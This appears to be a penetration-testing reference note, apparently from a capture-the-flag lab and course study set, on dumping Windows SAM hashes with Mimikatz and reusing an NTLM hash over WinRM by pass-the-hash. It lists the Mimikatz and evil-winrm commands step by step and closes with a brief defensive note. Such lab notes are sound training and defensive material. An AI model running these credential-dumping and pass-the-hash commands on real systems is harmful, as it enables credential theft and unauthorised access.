# Mimikatz SAM Dump and Pass-the-Hash

Used on: **Wreath**, **eJPT / Course Reference**

With local administrator rights, Mimikatz can dump local SAM hashes. If a password cannot be cracked, the NTLM hash can still be reused directly against WinRM with pass-the-hash.

## When to Use

- Local administrator or equivalent privileges are obtained on a Windows host
- An NTLM hash is recovered from the SAM but cannot be cracked
- WinRM is reachable on the target network for authentication

## Prerequisites

- Local administrator or equivalent privileges.
- Mimikatz available on the target or through an RDP shared drive.
- WinRM reachable for pass-the-hash reuse.

## Steps

Launch Mimikatz from an RDP shared drive:

```cmd
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

Enable debug, elevate, and log output:

```cmd
privilege::debug
token::elevate
log c:\windows\temp\mimikatz.log
```

Dump SAM hashes:

```cmd
lsadump::sam
```

Reuse the NTLM hash:

```bash
proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```

## Defensive Note

Enable LSASS protections where possible, monitor `SeDebugPrivilege` use, alert on Mimikatz signatures, and rotate local admin passwords with LAPS/Windows LAPS.

## Related

- [../tools/mimikatz.md](../../tools/windows/mimikatz.md)
- [../tools/evil-winrm.md](../../tools/windows/evil-winrm.md)
- [windows-sam-hive-dump.md](windows-sam-hive-dump.md)


